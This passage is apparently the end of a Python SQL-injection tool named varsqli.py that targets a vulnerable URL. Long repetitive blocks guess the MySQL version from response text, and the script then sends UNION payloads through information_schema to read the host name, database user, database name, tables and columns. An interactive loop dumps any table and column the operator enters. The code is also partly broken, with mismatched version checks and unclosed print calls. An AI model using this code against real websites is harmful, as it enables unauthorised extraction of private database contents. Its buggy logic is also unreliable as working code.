                                            print("web server operating version : MySQL >= 8.6 ")
                                          if "8.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.7 ")
                                          if "8.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.8 ")
                                          if "8.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.9 ")
                                          if "8.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 8.10 ")
                                          if "9.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.1 ")
                                          if "9.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.2 ")
                                          if "9.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.3 ")
                                          if "9.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.4 ")
                                          if "9.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.5 ")
                                          if "9.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.6 ")
                                          if "9.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.7 ")
                                          if "9.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.8 ")
                                          if "9.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.9 ")
                                          if "9.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 9.10 ")
                                          if "10.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.0 ")
                                          if "10.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.1 ")
                                          if "10.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.2 ")
                                          if "10.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.3 ")
                                          if "10.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.4 ")
                                          if "10.5" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.5 ")
                                          if "10.6" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.6 ")
                                          if "10.7" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.7 ")
                                          if "10.8" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.8 ")
                                          if "10.9" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.9 ")
                                          if "10.10" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 10.10 ")
                                          if "11.0" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.0 ")
                                          if "11.1" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.1 ")
                                          if "11.2" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.2 ")
                                          if "11.3" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.3 ")
                                          if "11.4" in results_get_ver.text:
                                            print("web server operating version : MySQL >= 11.4 ")

                                            
                                          if "ubuntu" in results_get_ver.text:
                                            print("web server operating system : Linux Ubuntu")
                                            if "5.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0")
                                            if "5.0.12" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0.12 ")
                                            if "5.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.1 ")
                                            if "5.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.2 ")
                                            if "5.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.3 ")
                                            if "5.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.4 ")
                                            if "5.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.5 ")
                                            if "5.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.6")
                                            if "5.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.9 ")
                                            if "5.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.10 ")
                                            if "6.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.0 ")
                                            if "6.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.1 ")
                                            if "6.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.2 ")
                                            if "6.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.3 ")
                                            if "6.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.4 ")
                                            if "6.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.5 ")
                                            if "6.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.6 ")
                                            if "6.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.9 ")
                                            if "6.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.10 ")
                                            if "7.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.0 ")
                                            if "7.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.1 ")
                                            if "7.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.2 ")
                                            if "7.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.3 ")
                                            if "7.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.4  ")
                                            if "7.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.5  ")
                                            if "7.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.6 ")
                                            if "7.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.7  ")
                                            if "7.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.8  ")
                                            if "7.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.9  ")
                                            if "7.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.10  ")
                                            if "8.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >=  8.0")
                                            if "8.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.1 ")
                                            if "8.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.2 ")
                                            if "8.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.3")
                                            if "8.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.4 ")
                                            if "8.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.5 ")
                                            if "8.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.6 ")
                                            if "8.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.7 ")
                                            if "8.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.8 ")
                                            if "8.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.9 ")
                                            if "8.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.10 ")
                                            if "9.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.1 ")
                                            if "9.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.2 ")
                                            if "9.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.3 ")
                                            if "9.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.4 ")
                                            if "9.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.5 ")
                                            if "9.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.6 ")
                                            if "9.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.7 ")
                                            if "9.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.8 ")
                                            if "9.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.9 ")
                                            if "9.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.10 ")
                                            if "10.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.0 ")
                                            if "10.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.1 ")
                                            if "10.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.2 ")
                                            if "10.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.3 ")
                                            if "10.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.4 ")
                                            if "10.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.5 ")
                                            if "10.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.6 ")
                                            if "10.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.7 ")
                                            if "10.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.8 ")
                                            if "10.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.9 ")
                                            if "10.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.10 ")
                                            if "11.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.0 ")
                                            if "11.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.1 ")
                                            if "11.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.2 ")
                                            if "11.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.3 ")
                                            if "11.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.4 ")

                                          if "cll-lve" in results_get_ver.text:
                                            print("web server operating system : Linux cll-lve")
                                            if "5.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0")
                                            if "5.0.12" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0.12 ")
                                            if "5.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.1 ")
                                            if "5.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.2 ")
                                            if "5.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.3 ")
                                            if "5.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.4 ")
                                            if "5.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.5 ")
                                            if "5.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.6")
                                            if "5.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.9 ")
                                            if "5.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.10 ")
                                            if "6.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.0 ")
                                            if "6.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.1 ")
                                            if "6.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.2 ")
                                            if "6.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.3 ")
                                            if "6.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.4 ")
                                            if "6.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.5 ")
                                            if "6.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.6 ")
                                            if "6.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.9 ")
                                            if "6.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.10 ")
                                            if "7.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.0 ")
                                            if "7.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.1 ")
                                            if "7.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.2 ")
                                            if "7.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.3 ")
                                            if "7.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.4  ")
                                            if "7.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.5  ")
                                            if "7.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.6 ")
                                            if "7.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.7  ")
                                            if "7.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.8  ")
                                            if "7.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.9  ")
                                            if "7.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.10  ")
                                            if "8.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >=  8.0")
                                            if "8.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.1 ")
                                            if "8.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.2 ")
                                            if "8.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.3")
                                            if "8.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.4 ")
                                            if "8.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.5 ")
                                            if "8.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.6 ")
                                            if "8.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.7 ")
                                            if "8.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.8 ")
                                            if "8.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.9 ")
                                            if "8.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.10 ")
                                            if "9.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.1 ")
                                            if "9.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.2 ")
                                            if "9.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.3 ")
                                            if "9.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.4 ")
                                            if "9.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.5 ")
                                            if "9.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.6 ")
                                            if "9.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.7 ")
                                            if "9.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.8 ")
                                            if "9.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.9 ")
                                            if "9.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.10 ")
                                            if "10.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.0 ")
                                            if "10.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.1 ")
                                            if "10.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.2 ")
                                            if "10.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.3 ")
                                            if "10.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.4 ")
                                            if "10.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.5 ")
                                            if "10.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.6 ")
                                            if "10.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.7 ")
                                            if "10.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.8 ")
                                            if "10.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.9 ")
                                            if "10.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.10 ")
                                            if "11.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.0 ")
                                            if "11.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.1 ")
                                            if "11.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.2 ")
                                            if "11.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.3 ")
                                            if "11.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.4 ")

                                          if "MariaDB" in results_get_ver.text:
                                            print("web server operating system : Linux MariaDB")
                                            if "5.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0")
                                            if "5.0.12" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.0.12 ")
                                            if "5.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.1 ")
                                            if "5.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.2 ")
                                            if "5.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.3 ")
                                            if "5.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.4 ")
                                            if "5.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.5 ")
                                            if "5.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.6")
                                            if "5.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.9 ")
                                            if "5.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 5.10 ")
                                            if "6.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.0 ")
                                            if "6.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.1 ")
                                            if "6.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.2 ")
                                            if "6.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.3 ")
                                            if "6.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.4 ")
                                            if "6.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.5 ")
                                            if "6.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.6 ")
                                            if "6.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.7 ")
                                            if "5.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.8 ")
                                            if "5.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.9 ")
                                            if "6.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 6.10 ")
                                            if "7.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.0 ")
                                            if "7.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.1 ")
                                            if "7.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.2 ")
                                            if "7.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.3 ")
                                            if "7.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.4  ")
                                            if "7.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.5  ")
                                            if "7.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.6 ")
                                            if "7.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.7  ")
                                            if "7.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.8  ")
                                            if "7.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.9  ")
                                            if "7.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 7.10  ")
                                            if "8.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >=  8.0")
                                            if "8.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.1 ")
                                            if "8.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.2 ")
                                            if "8.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.3")
                                            if "8.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.4 ")
                                            if "8.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.5 ")
                                            if "8.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.6 ")
                                            if "8.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.7 ")
                                            if "8.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.8 ")
                                            if "8.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.9 ")
                                            if "8.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 8.10 ")
                                            if "9.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.1 ")
                                            if "9.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.2 ")
                                            if "9.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.3 ")
                                            if "9.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.4 ")
                                            if "9.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.5 ")
                                            if "9.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.6 ")
                                            if "9.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.7 ")
                                            if "9.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.8 ")
                                            if "9.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.9 ")
                                            if "9.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 9.10 ")
                                            if "10.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.0 ")
                                            if "10.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.1 ")
                                            if "10.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.2 ")
                                            if "10.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.3 ")
                                            if "10.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.4 ")
                                            if "10.5" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.5 ")
                                            if "10.6" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.6 ")
                                            if "10.7" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.7 ")
                                            if "10.8" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.8 ")
                                            if "10.9" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.9 ")
                                            if "10.10" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 10.10 ")
                                            if "11.0" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.0 ")
                                            if "11.1" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.1 ")
                                            if "11.2" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.2 ")
                                            if "11.3" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.3 ")
                                            if "11.4" in results_get_ver.text:
                                              print("web server operating version : MySQL >= 11.4 ")

                                          print("[INFO] Starting Enumerate table name DBMS...")
                                          payload_2 = "(SELECT+GROUP_CONCAT(@@hostname,'::',@@port))"
                                          get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                          results_get_user = requests.get(target_url + get_user)
                                          html_cont = results_get_user.text
                                          userss = r"\b\w+::\b"
                                          dump_all = re.findall(userss, html_cont)
                                          for user in dump_all:
                                              print("[-] Host name :", user)
                                              
                                          payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',@@port))"
                                          get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                          results_get_user = requests.get(target_url + get_user)
                                          html_cont = results_get_user.text
                                          userss = r"\b\w+@\b\w+::\b"
                                          dump_all = re.findall(userss, html_cont)
                                          for user in dump_all:
                                              print("operating Enumerate: ")
                                              print("web server operating user mysql :", user)
                                          payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',@@port))"
                                          get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                          results_get_dbs = requests.get(target_url + get_dbs)
                                          html_cont = results_get_dbs.text
                                          databs = r"\b\w+::\b"
                                          dump_dbase = re.findall(databs, html_cont)
                                          for dbs in dump_dbase:
                                              print("web server operating Database 1 :", dbs)
                                              print("web server operating Database 2 : information_schema")
                                              print("--------")
                                              print("[INFO] Found 2 table database :")
                                              print("[+]", dbs)
                                              print("[+] information_schema")
                                              print("")
                                          print("[INFO] Starting Enumerate DBMS table name...")
                                          payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                          rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                          results_get_queries = requests.get(target_url + rm)
                                          html_cont = results_get_queries.text
                                          dbms = r"\b\w+::\b\w+::\b"
                                          database_all = re.findall(dbms, html_cont)
                                          print("Blind tables name")
                                          print("Dump DBS : {}".format(dbs))
                                          print("------------------")
                                          print("| table | column |")
                                          print("------------------")
                                          num_table = 0
                                          for database_table in database_all:
                                              num_table += 1
                                              print(f"[INFO] fetching database on {dbs} -->", database_table)
                                              time.sleep(0.30)
                                          print(f"[+] Found {num_table} Tables Name....")
                                          time.sleep(1)
                                          print("--------------------------")
                                          print("Table Name | Columns Name")
                                          print("--------------------------")
                                          for database in database_all:
                                              print(f"[+] {database} --> ", dbs, user)
                                              time.sleep(0.10)
                                          print('------------------------------------------------------------------------------')
                                          print(database_all)
                                          print('-------------------------------------------------------------------------------')
                                          print("")
                                          print("You Readly Dump Database Tables ? :")
                                          while True:
                                              print("")
                                              text_dump = input("Name Tables : ")
                                              text_dump2 = input("Name Columns : ")
                                              modu = f"(SElECT+GrOuP_cOnCaT({text_dump2},'::',@@port+SEPARATOR+'<br>')+FROM+{text_dump})"
                                              payload_dump = re.sub(r"\b{}\b".format(num_countss), modu, payload)
                                              results_dump = requests.get(target_url + payload_dump)
                                              texts_html = results_dump.text
                                              checking_data = r"\b\w+::\b"
                                              data_all = re.findall(checking_data, texts_html)
                                              for data in data_all:
                                                  print("+-----------------------------------------------------+"
                                                  print(f"[+] | {text_dump} | {text_dump2} | {dbs} |=> ", data)
                                                  print("+-----------------------------------------------------+")
                                          exit()
                                      else:
                                          pass
          
              else:
                  print("[WARNING] Target Injection Failed (this on line)")
                  exit()
          else:
              print("[WARNING] Target Not accept, response not found...")
              exit()

      check_url()
  else:
    print("Usage : python3 varsqli.py --url <URL> --exploit")
    exit()

else:
    print("Usage : python3 varsqli.py --url < URL Vulnerablity > --exploit")
    print("Help : python3 varsqli.py --help for helping")
    exit()
